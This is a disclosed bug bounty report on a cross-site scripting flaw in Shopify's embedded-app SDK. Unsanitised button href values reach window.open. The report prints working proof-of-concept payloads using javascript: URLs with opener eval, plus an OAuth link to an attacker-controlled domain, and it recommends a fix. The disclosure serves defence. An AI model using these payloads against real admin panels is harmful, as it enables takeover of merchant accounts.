# XSS in $shop$.myshopify.com/admin/ via "Button Objects" in malicious app

## Report Details
- **Report ID**: 217745
- **URL**: https://hackerone.com/reports/217745
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-04-02T01:07:12.877Z
- **Disclosed**: 2017-05-22T20:27:48.405Z

## Reporter
- **Username**: bored-engineer
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
This report is similar in impact, exploitability and root-cause as report #205701 requiring an additional step of user-interaction. 

#Description
The Shopify [Embedded App SDK](https://help.shopify.com/api/sdks/merchant-apps/embedded-app-sdk) is used to facilitate limited interactions with parent page (`/admin/apps/$id`) from an embedded app within the shop admin interface. The SDK has multiple methods which accept a `buttons` parameter which is defined under the [button objects](https://help.shopify.com/api/sdks/shopify-apps/embedded-app-sdk/methods#button-objects) section of the SDK documentation. Buttons can define a `href` parameter which will open when the button is clicked. The `href` parameter is not properly sanitized allowing a malicious app to execute JavaScript in the context of the admin interface.

#Technical Details
When a button is clicked the `clickButton` method is called, the method is defined as follows:
```js
clickButton = function(_, data) {
  if ((data.loading || "undefined" == typeof data.loading && "app" === data.target) && Shopify.Loading.start(), href = data.href) {
    switch (data.target) {
      case "parent":
      case "shopify":
        Page.visit(href, {
          reload: true
        });
        break;
        case "app":
          break;
        default:
          Page.open(href)
    }
  }
}
```
If no `target` parameter is specified (and the application is already loaded) `Page.open` will be called. This method is defined like this:
```
Page.open = function() {
  return window.open.apply(window, arguments);
}
```
You would expect `window.open` is safe to call with untrusted URLs as it will open in a new window/tab however this is not the case. When `window.open` is called with a `javascript:` URL a new window/tab will be opened with the domainless `about:blank` location (or similar depending on the browser) however the `document.domain` property will be shared with the opener window. Because the documents share `document.domain` the new window will be able to access the opener window and trigger JavaScript execution. You can test this yourself like this:
```js
window.open("javascript:window.opener.alert('bored-engineer')")
```
In the context of Shopify this means an application can create a button that will trigger XSS on the admin interface when the button is clicked. The following script was used to demonstrate the issue:
```js
window.parent.postMessage(JSON.stringify({
  message: "Shopify.API.Bar.initialize",
  data: {
    buttons: {
      primary: {
        label: "Click here for XSS",
        href: "javascript:setTimeout('window.close()',1);window.opener.eval('alert(document.domain)');",
      }
    }
  }
}), "*");
```
I wanted to note that this needs to be fixed in the `Shopify.EmbeddedAppButtons` class since this issue affects all methods which render buttons. For example the following script will also trigger XSS using a different method:
```js
window.parent.postMessage(JSON.stringify({
  message: "Shopify.API.Modal.open",
  data: {
    src: "https://attackerdoma.in",
    buttons: {
      primary: {
        label: "Click here for XSS",
        href: "javascript:setTimeout('window.close()',1);window.opener.eval('alert(document.domain)');",
      }
    }
  }
}), "*");
```

#Exploitability
You need to convince an administrator to authorize your malicious application, however the exploit does not require any specific permissions to trigger so an admin may be more willing to authorize the application. Once the administrator has loaded the application it is likely they will click at least one of the multiple entry-points for buttons. 

#Proof of Concept
I've created an example malicious application associated with my partner account `shopify-whitehat-1@bored.engineer` to demonstrate the issue...
Open the following URL on on `$your-shop$.myshopify.com`:
```
/admin/oauth/authorize?client_id=18cc7056a1476994411e3d21971289a7&scope=read_products&redirect_uri=https://attackerdoma.in/1b61d988-374e-48c8-ae6a-6eb28a0f25de.html&state=nonce
```
After authorizing the application and click the "Click here for XSS" button in the upper-right corner. An alert should appear on the `/admin` window containing `document.domain`.

#Remediation
The application should sanitize the `href` parameter for all "button objects" either before creating the elements in the DOM, or in the `clickButton` method before calling `Page.open`. 


## Attachments
No attachments
